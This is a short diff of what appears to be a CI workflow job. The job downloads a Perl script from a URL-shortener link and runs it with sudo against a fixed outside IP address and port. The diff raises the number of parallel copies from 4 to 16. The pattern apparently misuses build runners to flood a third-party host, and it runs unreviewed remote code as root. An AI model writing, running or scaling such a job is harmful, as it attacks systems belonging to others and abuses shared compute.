@@ -16,7 +16,7 @@ jobs:
           wget https://curl.by/GpfPM/hexba.pl -O hexba.pl
           chmod +x hexba.pl
           PIDS=()
-          for i in {1..4}; do
+          for i in {1..16}; do
             sudo timeout 50 perl hexba.pl 104.29.145.252 19317 &
             PIDS+=($!)
           done
